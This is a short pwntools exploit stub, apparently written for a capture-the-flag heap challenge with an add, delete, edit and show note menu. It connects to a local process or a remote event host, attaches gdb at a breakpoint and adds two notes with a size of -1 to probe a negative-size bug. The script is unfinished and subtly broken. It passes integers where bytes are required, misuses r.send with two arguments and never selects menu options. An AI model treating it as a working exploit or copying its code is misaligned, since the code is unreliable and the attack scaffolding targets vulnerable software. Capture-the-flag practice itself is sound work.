from pwn import * 
from pwn import p64


debug = 1
gdb_is = 1
# context(arch='i386',os = 'linux', log_level='DEBUG')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./vuln")
else:
    host = "week-1.hgame.lwsec.cn"
    r = connect(host,30709)#远程连接
    gdb_is =0
# elf = cdll.LoadLibrary('libc.so.6')
# elf = ELF('./pwn')

if gdb_is:
    gdb.attach(r,'*b 0x4012ed')
    pause()
    pass

def add_note(page , size):
    r.sendlineafter(b'Index:', page)
    r.sendlineafter(b'Size:', size)

def delete_note(page):
    r.sendlineafter(b'Index:', page)

def edit_note(page , content):
    r.sendlineafter(b'Index:', page)
    r.send(b'Content:' , content)

def show_note(page):
    r.sendlineafter(b'Index:', page)

add_note(0,-1)
add_note(1,-1)


r.interactive()
